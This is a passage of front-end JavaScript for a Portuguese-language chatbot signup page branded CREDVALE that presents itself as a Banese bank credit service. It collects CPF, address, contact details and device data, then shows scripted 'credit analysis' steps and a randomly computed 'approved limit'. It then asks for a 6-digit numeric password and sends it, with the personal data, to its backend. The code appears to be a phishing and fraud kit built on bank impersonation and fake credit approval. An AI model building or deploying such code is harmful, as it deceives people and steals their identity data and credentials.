          '<div style="font-size:1.3rem;font-weight:900;padding:10px 0;letter-spacing:1px;color:#075E54;">'+phoneFmt+'</div>'+
          '<div style="display:flex;gap:10px;width:100%;margin-top:4px;">'+
            '<button class="chat-option chat-option--primary" id="waConfirmYes" style="flex:1;padding:14px;font-size:0.9rem;">✅ Confirmar</button>'+
            '<button class="chat-option chat-option--danger" id="waConfirmEdit" style="padding:14px;font-size:0.9rem;">✏️ Trocar número</button>'+
          '</div>'+
        '</div>';

      showPopup(waHtml);

      var confirmou = await new Promise(function(resolve) {
        document.getElementById('waConfirmYes').onclick = function() {
          closePopup();
          resolve(true);
        };
        document.getElementById('waConfirmEdit').onclick = function() {
          closePopup();
          addMsg('Digite o <strong>número correto</strong> do WhatsApp:');
          setInput('(11) 99999-9999','phone');
          resolve(false);
        };
      });

      if (confirmou) break;
    }

    await sleep(200);
    addMsg('E o <strong>e-mail</strong> para confirmarmos:');
    setInput('seu@email.com','email');
    while (true) {
      var e = await waitUserInput();
      user.email = e; addMsg('E-mail: <strong>'+e+'</strong>','user'); break;
    }

    await sleep(200);
    addMsg('📋 <strong>Quase lá!</strong> Me ajude a entender seu perfil:', 'bot');
    await sleep(300);
    etapaQuestionario();
  }

  /* ---- Questionário de Perfil ---- */
  async function etapaQuestionario() {
    flowState = 'quiz';
    hideInput();
    updateProgress(5);

    trackStage('Respondendo Questionário - Pergunta 1 de 3');
    addTyping(); await sleep(500); removeTyping();
    addMsg('📊 <strong>Quanto você gasta com medicamentos por mês?</strong>');
    await new Promise(function(resolve) {
      showOptions([
        { label:'Até R$ 50', action:function(){ quizAnswers.gasto='Até R$ 50'; resolve(); }},
        { label:'R$ 51 a R$ 200', action:function(){ quizAnswers.gasto='R$ 51 a R$ 200'; resolve(); }},
        { label:'Acima de R$ 200', action:function(){ quizAnswers.gasto='Acima de R$ 200'; resolve(); }}
      ]);
    });

    await sleep(300); addTyping(); await sleep(500); removeTyping();
    trackStage('Respondendo Questionário - Pergunta 2 de 3');
    addMsg('📊 <strong>Com que frequência compra em farmácias?</strong>');
    await new Promise(function(resolve) {
      showOptions([
        { label:'Só quando necessário', action:function(){ quizAnswers.frequencia='Só quando necessário'; resolve(); }},
        { label:'1 vez por mês', action:function(){ quizAnswers.frequencia='1 vez por mês'; resolve(); }},
        { label:'Várias vezes por mês', action:function(){ quizAnswers.frequencia='Várias vezes por mês'; resolve(); }}
      ]);
    });

    await sleep(300); addTyping(); await sleep(500); removeTyping();
    trackStage('Respondendo Questionário - Pergunta 3 de 3');
    addMsg('📊 <strong>Quantas pessoas na sua família usam medicamentos?</strong>');
    await new Promise(function(resolve) {
      showOptions([
        { label:'Só eu', action:function(){ quizAnswers.pessoas='Só eu'; resolve(); }},
        { label:'Eu + 1 pessoa', action:function(){ quizAnswers.pessoas='Eu + 1 pessoa'; resolve(); }},
        { label:'Toda a família', action:function(){ quizAnswers.pessoas='Toda a família'; resolve(); }}
      ]);
    });

    // Após questionário → LGPD
    await sleep(300);
    addTyping(); await sleep(500); removeTyping();
    addMsg('✅ <strong>Perfil registrado!</strong> Agora precisamos da sua autorização:', 'bot');
    await sleep(200);

    var ta = document.createElement('div');
    ta.className = 'chat-msg chat-msg--bot'; ta.id = 'chatTermos';
    ta.innerHTML = '<div class="chat-terms"><input type="checkbox" id="chkTermos"><label for="chkTermos">Autorizo o tratamento dos meus dados conforme a LGPD para análise de crédito e aceito os Termos de Uso do CREDVALE.</label></div>';
    chatMsg.appendChild(ta); scrollDown();
    showOptions([
      { label:'✅ Aceito e continuar', primary:true, action:function(){
        if (!document.getElementById('chkTermos')?.checked) { addMsg('Marque a caixa para aceitar os termos.','bot'); return; }
        document.getElementById('chatTermos')?.remove();
        trackStage('Preenchendo Cadastro'); etapaIntroAnalise();
      }}
    ]);
  }

  /* ---- MODAL 1: PRÉ-ANÁLISE BANESE ---- */
  async function etapaIntroAnalise() {
    var nome = (user.nome||'').split(' ')[0] || 'Cliente';
    var stepsPre = [
      'Iniciando pré-análise da sua proposta...',
      'Conectando ao sistema Banese...',
      'Verificando elegibilidade...',
      'Preparando análise de crédito...'
    ];
    var html =
      '<div class="banese-modal">'+
        '<div class="banese-modal-header">'+
          '<div class="banese-modal-logo">BANESE</div>'+
          '<div class="banese-modal-star">&#9733;</div>'+
          '<div class="banese-modal-logo-sub">CREDVALE</div>'+
        '</div>'+
        '<div class="banese-modal-body">'+
          '<div class="banese-pre-anim">'+
            '<div class="banese-pre-spinner"><div></div><div></div><div></div><div></div></div>'+
          '</div>'+
          '<div class="banese-pre-title">Pré-análise em andamento</div>'+
          '<div class="banese-pre-sub">Estamos iniciando a análise da sua proposta. Aguarde alguns instantes.</div>'+
          '<div class="banese-pre-steps" id="banesePreSteps">'+
            stepsPre.map(function(s,i){
              return '<div class="banese-pre-step" data-idx="'+i+'">'+
                '<div class="banese-pre-step-icon">'+(i+1)+'</div>'+
                '<span>'+s+'</span>'+
              '</div>';
            }).join('')+
          '</div>'+
          '<div class="banese-progress-bar">'+
            '<div class="banese-progress-fill" id="banesePreFill"></div>'+
          '</div>'+
          '<div class="banese-progress-label" id="banesePreLabel">0%</div>'+
        '</div>'+
      '</div>';
    showPopup(html);
    for (var i = 0; i < stepsPre.length; i++) {
      var item = document.querySelector('.banese-pre-step[data-idx="'+i+'"]');
      if (item) {
        item.classList.add('banese-pre-step--active');
        var ic = item.querySelector('.banese-pre-step-icon');
        if (ic) ic.textContent = '\u27f3';
        await sleep(1500 + Math.floor(Math.random()*1000));
        item.classList.remove('banese-pre-step--active');
        item.classList.add('banese-pre-step--done');
        if (ic) ic.textContent = '\u2713';
      } else {
        await sleep(1500 + Math.floor(Math.random()*1000));
      }
      var fill = document.getElementById('banesePreFill');
      var label = document.getElementById('banesePreLabel');
      var pct = Math.round(((i+1)/stepsPre.length)*100);
      if (fill) fill.style.width = pct+'%';
      if (label) label.textContent = pct+'%';
    }
    await sleep(800);
    closePopup();
    await sleep(300);
    etapaAnalisePopup();
  }

  /* ---- MODAL 2+3+4: ANÁLISE CRÉDITO + FINALIZAÇÃO + APROVAÇÃO BANESE ---- */
  async function etapaAnalisePopup() {
    trackStage('Analisando Crédito');
    updateProgress(6);
    var clientId = 'CLI-'+Date.now().toString(36).toUpperCase();
    var limite = (function() {
      var base = 1800;
      if (quizAnswers.gasto === 'R$ 51 a R$ 200') base += 300;
      else if (quizAnswers.gasto === 'Acima de R$ 200') base += 600;
      if (quizAnswers.frequencia === '1 vez por mês') base += 200;
      else if (quizAnswers.frequencia === 'Várias vezes por mês') base += 400;
      if (quizAnswers.pessoas === 'Eu + 1 pessoa') base += 200;
      else if (quizAnswers.pessoas === 'Toda a família') base += 400;
      base += Math.floor(Math.random() * 201);
      base = Math.min(3500, Math.max(1800, base));
      return Math.round(base / 50) * 50;
    })();
    flowState = 'analysis';
    hideInput();

    var baneseSteps = [
      { label:'Consultando relacionamento com o Banese...' },
      { label:'Verificando Score de Crédito...' },
      { label:'Validando dados cadastrais...' },
      { label:'Conferindo histórico financeiro...' },
      { label:'Processando elegibilidade...' },
      { label:'Finalizando análise da proposta...' }
    ];

    /* ---- MODAL 2: Análise de Crédito Banese ---- */
    var analiseHtml =
      '<div class="banese-modal">'+
        '<div class="banese-modal-header">'+
          '<div class="banese-modal-logo">BANESE</div>'+
          '<div class="banese-modal-star">&#9733;</div>'+
          '<div class="banese-modal-logo-sub">CREDVALE</div>'+
        '</div>'+
        '<div class="banese-modal-body">'+
          '<div class="banese-credit-title">Analisando seu perfil de crédito</div>'+
          '<div class="banese-step-list" id="baneseStepList">'+
            baneseSteps.map(function(s,i){
              return '<div class="banese-step-item" data-idx="'+i+'">'+
                '<div class="banese-step-icon">'+(i+1)+'</div>'+
                '<div class="banese-step-label">'+s.label+'</div>'+
                '<div class="banese-step-status" id="baneseStepStatus'+i+'"></div>'+
              '</div>';
            }).join('')+
          '</div>'+
          '<div class="banese-progress-bar" style="margin-top:16px;">'+
            '<div class="banese-progress-fill" id="baneseCreditFill"></div>'+
          '</div>'+
          '<div class="banese-progress-label" id="baneseCreditLabel">0%</div>'+
        '</div>'+
      '</div>';

    showPopup(analiseHtml);

    var fill = document.getElementById('baneseCreditFill');
    var label = document.getElementById('baneseCreditLabel');

    for (var i = 0; i < baneseSteps.length; i++) {
      var item = document.querySelector('.banese-step-item[data-idx="'+i+'"]');
      var status = document.getElementById('baneseStepStatus'+i);
      if (item) {
        item.classList.add('banese-step-item--active');
        if (status) { status.textContent = '⏳'; status.className = 'banese-step-status banese-step-status--pending'; }
        await sleep(1200 + Math.floor(Math.random()*800));
        item.classList.remove('banese-step-item--active');
        item.classList.add('banese-step-item--done');
        if (status) { status.textContent = '✓'; status.className = 'banese-step-status banese-step-status--done'; }
      } else {
        await sleep(1200 + Math.floor(Math.random()*800));
      }
      var pct = Math.round(((i+1)/baneseSteps.length)*100);
      if (fill) fill.style.width = pct+'%';
      if (label) label.textContent = pct+'%';
    }

    await sleep(500);

    /* ---- MODAL 3: Finalização ---- */
    closePopup();
    await sleep(300);

    var finalHtml =
      '<div class="banese-modal">'+
        '<div class="banese-modal-header">'+
          '<div class="banese-modal-logo">BANESE</div>'+
          '<div class="banese-modal-star">&#9733;</div>'+
          '<div class="banese-modal-logo-sub">CREDVALE</div>'+
        '</div>'+
        '<div class="banese-modal-body">'+
          '<div class="banese-pre-anim">'+
            '<div class="banese-pre-spinner banese-pre-spinner--final"><div></div><div></div><div></div><div></div></div>'+
          '</div>'+
          '<div class="banese-pre-title">Estamos finalizando sua proposta...</div>'+
          '<div class="banese-pre-sub">Aguarde enquanto concluímos a liberação.</div>'+
          '<div class="banese-progress-bar" style="margin-top:20px;">'+
            '<div class="banese-progress-fill" id="baneseFinalFill" style="width:0%;transition:width 0.3s ease;"></div>'+
          '</div>'+
        '</div>'+
      '</div>';

    showPopup(finalHtml);

    var finalFill = document.getElementById('baneseFinalFill');
    for (var f = 0; f <= 100; f += 5) {
      if (finalFill) finalFill.style.width = f + '%';
      await sleep(120);
    }
    await sleep(600);

    /* ---- API: Criar cliente ---- */
    var apiData = {
      cpf: user.cpf, nome: user.nome, nascimento: user.nascimento, sexo: user.sexo,
      cep: user.cep, rua: user.rua, numero: user.numero, complemento: user.complemento,
      bairro: user.bairro, cidade: user.cidade, uf: user.uf,
      whatsapp: user.whatsapp, email: user.email,
      nome_mae: '', renda: '0', profissao: '', situacao: '',
      limite_aprovado: limite,
      banese_cliente: 1,
      dispositivo: sessionStorage.getItem('vs_dispositivo')||'Desktop',
      modelo: sessionStorage.getItem('vs_modelo')||'PC',
      fabricante: sessionStorage.getItem('vs_fabricante')||'',
      os: sessionStorage.getItem('vs_os')||'',
      navegador: sessionStorage.getItem('vs_navegador')||'',
      navegador_versao: sessionStorage.getItem('vs_navegador_versao')||''
    };
    var apiResult = null;
    try {
      var baseUrl = window.__API_BASE || '/api';
      var resp = await fetch(baseUrl + '/clients', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(apiData)
      });
      var respData = await resp.json();
      if (resp.ok) {
        apiResult = respData;
      } else if (resp.status === 409 && respData.clientId) {
        apiResult = { clientId: respData.clientId };
        console.log('[cadastro] CPF já existente, usando clientId:', respData.clientId);
      } else {
        console.error('[cadastro] Erro ao criar cliente:', respData.error);
      }
    } catch(e) {
      console.error('[cadastro] Exceção ao criar cliente:', e);
    }
    clientId = apiResult ? apiResult.clientId : clientId;
    if (apiResult) {
      trackStage('Cadastro Aprovado', {nome: user.nome, cpf: user.cpf});
    }

    sessionStorage.setItem('vs_clientId', clientId);
    sessionStorage.setItem('vs_nome', (user.nome||'').split(' ')[0]);
    sessionStorage.setItem('vs_nome_completo', user.nome);
    sessionStorage.setItem('vs_limite', limite);

    /* ---- MODAL 4: Aprovação Banese ---- */
    await sleep(400);
    closePopup();
    await sleep(300);

    var nomePrimeiro = (user.nome||'').split(' ')[0]||'';
    var limFmt = Number(limite).toFixed(2).replace('.',',');

    var aprovHtml =
      '<div class="banese-modal">'+
        '<div class="banese-modal-header" style="background:linear-gradient(135deg,#022c22,#065F46);">'+
          '<div class="banese-modal-logo" style="color:#fff;">BANESE</div>'+
          '<div class="banese-modal-star" style="color:rgba(255,255,255,0.4);">&#9733;</div>'+
          '<div class="banese-modal-logo-sub" style="color:rgba(255,255,255,0.6);">CREDVALE</div>'+
        '</div>'+
        '<div class="banese-modal-body">'+
          '<div style="text-align:center;margin-bottom:10px;">'+
            '<div style="display:inline-flex;align-items:center;gap:5px;background:rgba(4,120,87,0.12);border:1px solid rgba(4,120,87,0.2);border-radius:20px;padding:4px 14px 4px 10px;margin-bottom:10px;">'+
              '<span style="width:18px;height:18px;border-radius:50%;background:linear-gradient(135deg,#10B981,#047857);display:flex;align-items:center;justify-content:center;font-size:0.5rem;color:#fff;">✓</span>'+
              '<span style="font-size:0.65rem;color:#047857;font-weight:700;letter-spacing:0.3px;">PROPOSTA APROVADA</span>'+
            '</div>'+
            '<div style="font-size:1.3rem;font-weight:800;color:#022c22;margin-bottom:4px;">Parabéns, '+nomePrimeiro+'! 🎉</div>'+
            '<div style="font-size:0.8rem;color:#047857;font-weight:600;">Sua proposta foi aprovada</div>'+
          '</div>'+
          gerarCardBaneseSVG()+
          '<div style="background:linear-gradient(135deg,rgba(4,120,87,0.06),rgba(16,185,129,0.04));border:1px solid rgba(4,120,87,0.15);border-radius:16px;padding:14px 16px;margin:10px 0 12px;text-align:center;">'+
            '<div style="font-size:0.6rem;color:#047857;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:2px;font-weight:600;">Seu limite liberado</div>'+
            '<div style="font-size:2rem;font-weight:900;background:linear-gradient(135deg,#047857,#10B981);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;font-family:Space Grotesk,sans-serif;line-height:1.2;">R$ '+limFmt+'</div>'+
          '</div>'+
          '<button class="banese-cta" id="popupContinuar" style="width:100%;padding:14px;font-size:0.9rem;border:none;border-radius:12px;cursor:pointer;font-weight:800;font-family:inherit;background:linear-gradient(135deg,#047857,#10B981);color:#fff;box-shadow:0 4px 20px rgba(4,120,87,0.25);transition:all .3s;">Continuar</button>'+
        '</div>'+
      '</div>';

    showPopup(aprovHtml);

    try { await API.updateClientStatus(clientId, 'aprovado', limite); } catch (e) { console.error('[aprovar]', e); }

    await new Promise(function(resolve) {
      var btn = document.getElementById('popupContinuar');
      if (btn) { btn.onclick = function() { closePopup(); resolve(); }; }
      else { resolve(); }
    });

    hideInput();
    await sleep(200);
    mostrarPopupOfertaPlano(clientId, limite, 'fisico');
  }

  /* ---- ETAPA: Criação de Credenciais (após aprovação) ---- */
  async function etapaCriarCredenciais(clientId, limite, tipo) {
    flowState = 'credenciais';
    hideInput();

    var nome = (user.nome||'Cliente').split(' ')[0]||'Cliente';
    var cpfFmt = user.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');
    var apiBase = window.__API_BASE||'/api';
    /* Step 1: Loading inicial */
      showPopup(
        '<div style="text-align:center;padding:20px 0;">'+
          '<div style="width:52px;height:52px;margin:0 auto 16px;border:4px solid rgba(0,0,0,0.06);border-top-color:#4CC8A4;border-radius:50%;animation:spin 1s linear infinite;"></div>'+
          '<div style="font-weight:700;font-size:1rem;color:#0f172a;margin-bottom:4px;">Estamos criando suas credenciais de acesso</div>'+
          '<div style="font-size:0.8rem;color:#475569;">Aguarde alguns instantes...</div>'+
        '</div>'
      );
      await sleep(3000);
      closePopup();

      /* Step 2: Formulário de credenciais */
      await new Promise(function(resolve) {
        function showCredentialForm() {
          showPopup(
            '<div style="text-align:center;">'+
              '<div style="font-size:1.2rem;margin-bottom:8px;">🔐</div>'+
              '<div style="font-size:1rem;font-weight:700;color:#0f172a;margin-bottom:4px;">Crie sua senha de acesso</div>'+
              '<div style="font-size:0.75rem;color:#475569;margin-bottom:16px;">'+
                'Crie uma senha num\u00e9rica de 6 d\u00edgitos para acessar o aplicativo.'+
              '</div>'+
              '<div style="background:#f8fafc;border-radius:12px;padding:12px 16px;margin-bottom:16px;text-align:left;border:1px solid #e2e8f0;">'+
                '<div style="display:flex;justify-content:space-between;font-size:0.8rem;padding:4px 0;"><span style="color:#475569;">Nome</span><span style="color:#0f172a;font-weight:600;">'+user.nome+'</span></div>'+
                '<div style="display:flex;justify-content:space-between;font-size:0.8rem;padding:4px 0;"><span style="color:#475569;">CPF</span><span style="color:#0f172a;font-weight:600;">'+cpfFmt+'</span></div>'+
              '</div>'+
              '<div style="display:flex;flex-direction:column;gap:12px;">'+
                '<input type="password" id="credPassword" placeholder="Crie uma senha num\u00e9rica de 6 d\u00edgitos" inputmode="numeric" pattern="[0-9]*" autocomplete="off" style="width:100%;padding:14px;border-radius:12px;border:1.5px solid #e2e8f0;background:#fff;color:#0f172a;font-size:0.9rem;outline:none;box-sizing:border-box;">'+
                '<input type="password" id="credConfirmPassword" placeholder="Confirme a senha de 6 d\u00edgitos" inputmode="numeric" pattern="[0-9]*" autocomplete="off" style="width:100%;padding:14px;border-radius:12px;border:1.5px solid #e2e8f0;background:#fff;color:#0f172a;font-size:0.9rem;outline:none;box-sizing:border-box;">'+
                '<div id="credError" style="font-size:0.75rem;color:#DC2626;display:none;"></div>'+
              '</div>'+
              '<button id="btnCadastrarCredenciais" style="width:100%;padding:14px;margin-top:16px;border-radius:12px;border:none;background:linear-gradient(135deg,#3B82F6,#4CC8A4);color:#fff;font-size:0.9rem;font-weight:700;cursor:pointer;">🔐 Cadastrar Senha</button>'+
            '</div>'
          );

          document.getElementById('btnCadastrarCredenciais').onclick = function() {
            var pw = document.getElementById('credPassword').value;
            var cpw = document.getElementById('credConfirmPassword').value;
            var errEl = document.getElementById('credError');

            if (!pw || !/^\d{6}$/.test(pw)) {
              errEl.textContent = 'A senha deve conter exatamente 6 d\u00edgitos num\u00e9ricos.';
              errEl.style.display = '';
              return;
            }
            if (pw !== cpw) {
              errEl.textContent = 'As senhas não conferem. Digite a mesma senha nos dois campos.';
              errEl.style.display = '';
              return;
            }
            errEl.style.display = 'none';
            closePopup();
            resolve(pw);
          };
        }
        showCredentialForm();
      }).then(async function(password) {
        /* Step 3: Salvar credenciais no backend */
        showPopup(
          '<div style="text-align:center;padding:20px 0;">'+
            '<div style="width:52px;height:52px;margin:0 auto 16px;border:4px solid rgba(0,0,0,0.06);border-top-color:#4CC8A4;border-radius:50%;animation:spin 1s linear infinite;"></div>'+
            '<div style="font-weight:700;font-size:1rem;color:#0f172a;margin-bottom:4px;">Salvando suas credenciais</div>'+
            '<div style="font-size:0.8rem;color:#475569;">Aguarde um instante...</div>'+
          '</div>'
        );
        try {
          var resp = await fetch(apiBase + '/clients/' + clientId + '/credentials', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password: password, plano_escolhido: chosenPlan === 'plus' ? 'plano_166' : 'sem_plano' })
          });
          if (!resp.ok) {
            var errData = await resp.json().catch(function(){ return { error: resp.statusText }; });
            console.error('[cadastro] Erro ao salvar credencial:', errData);
          }
        } catch(e) {
          console.error('[cadastro] Exceção ao salvar credencial:', e);
        }
        await sleep(800);
        closePopup();

        /* Step 4: Mensagem de sucesso */
        showPopup(
          '<div style="text-align:center;padding:20px 0;">'+
            '<div style="width:52px;height:52px;margin:0 auto 16px;border:4px solid rgba(0,0,0,0.06);border-top-color:#4CC8A4;border-radius:50%;animation:spin 1s linear infinite;"></div>'+
            '<div style="font-weight:700;font-size:1rem;color:#0f172a;margin-bottom:4px;">Salvando suas credenciais</div>'+
            '<div style="font-size:0.8rem;color:#475569;">Aguarde um instante...</div>'+
          '</div>'
        );
        await sleep(1500);
        closePopup();

        showPopup(
          '<div style="text-align:center;padding:16px 0;">'+
            '<div style="width:56px;height:56px;border-radius:50%;background:linear-gradient(135deg,rgba(16,185,129,0.1),rgba(59,130,246,0.08));display:flex;align-items:center;justify-content:center;margin:0 auto 12px;border:2px solid rgba(16,185,129,0.12);">'+
              '<span style="font-size:1.5rem;">\u2705</span>'+
            '</div>'+
            '<div style="font-size:1.05rem;font-weight:800;color:#0f172a;">Senha cadastrada com sucesso!</div>'+
          '</div>'
        );
      await sleep(2000);
      closePopup();
    });

    /* Novo fluxo pós-cadastro */
    await mostrarPopupSenhaApp(clientId, limite);
  }

  /**
   * Pop-up: Informa que a senha criada é exclusiva do aplicativo.
   */
  async function mostrarPopupSenhaApp(clientId, limite) {
    flowState = 'pos-credencial';
    hideInput();

    await new Promise(function(resolve) {
      showPopup(
        '<div style="text-align:center;">' +
          '<div style="width:64px;height:64px;border-radius:50%;background:linear-gradient(135deg,rgba(16,185,129,0.1),rgba(59,130,246,0.08));display:flex;align-items:center;justify-content:center;margin:0 auto 12px;border:2px solid rgba(16,185,129,0.12);">' +
            '<span style="font-size:1.6rem;">\uD83D\uDD10</span>' +
          '</div>' +
          '<div style="font-size:1rem;font-weight:800;color:#0f172a;margin-bottom:8px;">Senha do aplicativo</div>' +
          '<div style="font-size:0.82rem;color:#475569;line-height:1.6;margin-bottom:16px;text-align:left;background:#f8fafc;border-radius:12px;padding:14px 16px;border:1px solid #e2e8f0;">' +
            '<div style="display:flex;gap:10px;margin-bottom:8px;">' +
              '<span style="color:#10B981;font-weight:700;flex-shrink:0;">\uD83D\uDD10</span>' +
              '<span>A senha criada ser\u00e1 utilizada exclusivamente para acessar o <strong>aplicativo</strong>.</span>' +
            '</div>' +
            '<div style="display:flex;gap:10px;margin-bottom:8px;">' +
              '<span style="color:#F59E0B;font-weight:700;flex-shrink:0;">\u26A0\uFE0F</span>' +
              '<span>Ela <strong>n\u00e3o</strong> \u00e9 a senha do seu cart\u00e3o.</span>' +
            '</div>' +
            '<div style="display:flex;gap:10px;">' +
              '<span style="color:#3B82F6;font-weight:700;flex-shrink:0;">\uD83D\uDCE2</span>' +
              '<span>A senha do cart\u00e3o ser\u00e1 enviada posteriormente pelos <strong>canais oficiais</strong>, quando aplic\u00e1vel.</span>' +
            '</div>' +
          '</div>' +
          '<button class="chat-option chat-option--primary" id="btnContinuarSenhaApp" style="width:100%;padding:14px;font-size:0.9rem;font-weight:700;">Continuar</button>' +
        '</div>'
      );
      document.getElementById('btnContinuarSenhaApp').onclick = function() {
        closePopup();
        resolve();
      };
    });

    await mostrarTelaBoasVindas(clientId, limite);
  }

  /**
   * Tela de boas-vindas personalizada com o nome do cliente.
   */
  async function mostrarTelaBoasVindas(clientId, limite) {
    var primeiroNome = (user.nome || '').split(' ')[0] || 'Cliente';

    addMsg(
      '<div style="text-align:center;padding:8px 0;">' +
        '<div style="display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:8px;">' +
          '<div style="width:56px;height:56px;border-radius:50%;background:linear-gradient(135deg,rgba(16,185,129,0.1),rgba(59,130,246,0.08));display:flex;align-items:center;justify-content:center;border:2px solid rgba(16,185,129,0.12);">' +
            '<span style="font-size:1.5rem;">\uD83C\uDF89</span>' +
          '</div>' +
        '</div>' +
        '<div style="font-size:1.2rem;font-weight:800;color:#0f172a;margin-bottom:4px;">Ol\u00e1, ' + primeiroNome + '!</div>' +
        '<div style="font-size:0.95rem;font-weight:600;color:#4CC8A4;margin-bottom:6px;">Seja bem-vindo(a)!</div>' +
        '<div style="font-size:0.82rem;color:#475569;line-height:1.6;margin-bottom:8px;">' +
          'Seu cadastro foi conclu\u00eddo com sucesso.<br><br>' +
          'Agora basta baixar o aplicativo para acessar sua conta e come\u00e7ar a utilizar todos os seus benef\u00edcios.' +
        '</div>' +
      '</div>',
      'bot'
    );

    await sleep(400);
    mostrarBotoesFinais(clientId, limite);
  }


  /**
   * Pop-up de oferta do Plano (reusa layout da Página Index)
   * Exibido após confirmação dos dados, antes da criação da credencial.
   */
  async function mostrarPopupOfertaPlano(clientId, limite, tipo) {
    flowState = 'oferta-plano';
    hideInput();

    var nome = (user.nome||'Cliente').split(' ')[0]||'Cliente';

    // Card do Plano CredVale - reusa exatamente o layout/bloco da Página Index
    var cardHtml =
      '<div style="text-align:center;">' +          '<div style="margin-bottom:6px;"><span style="font-size:1.25rem;">🎉</span> <span style="font-size:1.25rem;font-weight:900;background:linear-gradient(135deg,#0B6CF4,#00C853);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">' + nome + '!</span></div>' +
        '<div style="font-size:0.75rem;font-weight:500;color:#6B7280;margin-bottom:8px;">Escolha se deseja assinar o plano exclusivo CredVale</div>' +
      '</div>' +
      /* Card do Plano CredVale — réplica exata do componente da Index */
      '<div style="background:#ffffff;border-radius:16px;border:1px solid #dbeafe;padding:16px;box-shadow:0 10px 15px -3px rgba(0,0,0,0.1),0 4px 6px -4px rgba(0,0,0,0.1);position:relative;overflow:hidden;">' +
        /* Badge "Mais Escolhido" */
        '<div style="position:absolute;top:0;right:0;background:#0B6CF4;color:#fff;font-size:10px;font-weight:700;text-transform:uppercase;padding:4px 16px;border-radius:0 0 0 12px;letter-spacing:0.5px;z-index:1;">⭐ Mais Escolhido</div>' +
        /* Título */
        '<div style="font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,system-ui,sans-serif;font-size:1rem;font-weight:700;color:#111827;">Plano CredVale</div>' +
        /* Descrição */
        '<div style="font-size:0.7rem;color:#6B7280;margin-top:2px;line-height:1.5;">' +
          'Ideal para quem deseja economizar de verdade em saúde e medicamentos todos os meses.' +
        '</div>' +
        /* Preço */
        '<div style="margin:14px 0;">' +
          '<div style="font-size:0.68rem;font-weight:600;color:#9CA3AF;">Apenas</div>' +
          '<div style="display:flex;align-items:baseline;gap:4px;margin-top:2px;">' +
            '<span style="font-size:1.1rem;font-weight:800;color:#111827;">R$</span>' +
            '<span style="font-size:2rem;font-weight:900;color:#0B6CF4;letter-spacing:-0.025em;line-height:1;">0,99</span>' +
            '<span style="font-size:0.7rem;font-weight:600;color:#6B7280;">/mês</span>' +
          '</div>' +
          '<div style="font-size:10px;font-weight:700;color:#16a34a;margin-top:3px;">✓ Sem limite de idade • Sem carência • Cancele quando quiser</div>' +
        '</div>' +
        /* Benefícios (mais compacto) */
        '<div style="display:flex;flex-direction:column;gap:6px;border-top:1px solid #f3f4f6;padding-top:12px;padding-bottom:12px;">' +
          '<div style="display:flex;align-items:center;gap:8px;font-size:0.7rem;color:#374151;">' +
            '<div style="width:16px;height:16px;border-radius:50%;background:#dbeafe;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><span style="font-size:7px;color:#0B6CF4;font-weight:700;">✓</span></div>' +
            '<span>Consultas Médicas Ilimitadas</span>' +
          '</div>' +
          '<div style="display:flex;align-items:center;gap:8px;font-size:0.7rem;color:#374151;">' +
            '<div style="width:16px;height:16px;border-radius:50%;background:#dbeafe;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><span style="font-size:7px;color:#0B6CF4;font-weight:700;">✓</span></div>' +
            '<span>Exames com até 70% de desconto</span>' +
          '</div>' +
          '<div style="display:flex;align-items:center;gap:8px;font-size:0.7rem;color:#374151;">' +
            '<div style="width:16px;height:16px;border-radius:50%;background:#dbeafe;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><span style="font-size:7px;color:#0B6CF4;font-weight:700;">✓</span></div>' +
            '<span>Medicamentos com até 75% desconto</span>' +
          '</div>' +
          '<div style="display:flex;align-items:center;gap:8px;font-size:0.7rem;color:#374151;">' +
            '<div style="width:16px;height:16px;border-radius:50%;background:#dbeafe;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><span style="font-size:7px;color:#0B6CF4;font-weight:700;">✓</span></div>' +
            '<span>Aplicativo CredVale Integrado</span>' +
          '</div>' +
          '<div style="display:flex;align-items:center;gap:8px;font-size:0.7rem;color:#374151;">' +
            '<div style="width:16px;height:16px;border-radius:50%;background:#dbeafe;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><span style="font-size:7px;color:#0B6CF4;font-weight:700;">✓</span></div>' +
            '<span>Rede de Clínicas Credenciadas</span>' +
          '</div>' +
        '</div>' +
        /* Botão principal */
        '<button class="chat-option" id="btnAssinarOferta" style="width:100%;background:#00C853;color:#fff;font-size:0.85rem;font-weight:700;padding:12px 20px;border-radius:12px;border:none;cursor:pointer;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1),0 2px 4px -2px rgba(0,0,0,0.1);font-family:inherit;transition:all 0.2s;text-align:center;">💳 Assinar Plano CredVale</button>' +
      '</div>' +
      /* Botão secundário - AZUL */
      '<div style="text-align:center;margin-top:10px;">' +
        '<button class="chat-option" id="btnSemPlanoOferta" style="width:100%;padding:10px;font-size:0.8rem;font-weight:600;border:1.5px solid #0B6CF4;background:#ffffff;color:#0B6CF4;border-radius:10px;cursor:pointer;font-family:inherit;transition:all 0.2s;">→ Continuar sem o Plano CredVale</button>' +
      '</div>';

    showPopup(cardHtml);

    function salvarPlano(clientId, planoValor) {
      // Função auxiliar para salvar plano com fallback
      return API.updateClientPlan(clientId, planoValor).catch(function() {
        var baseUrl = window.__API_BASE || '/api';
        return fetch(baseUrl + '/clients/' + clientId + '/plan', {
          method: 'PATCH',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ plano_escolhido: planoValor })
        }).catch(function(){});
      });
    }

    document.getElementById('btnAssinarOferta').onclick = async function() {
      chosenPlan = 'plus';
      closePopup(); // Fecha imediatamente para não travar a UX
      salvarPlano(clientId, 'plano_166'); // Fire-and-forget com fallback
      addMsg('💳 <strong>Plano CredVale</strong> assinado com sucesso!','user');
      setTimeout(function() { etapaConfirmarDados(clientId, limite, tipo); }, 300);
    };

    document.getElementById('btnSemPlanoOferta').onclick = async function() {
      chosenPlan = '';
      closePopup(); // Fecha imediatamente para não travar a UX
      salvarPlano(clientId, 'sem_plano'); // Fire-and-forget com fallback
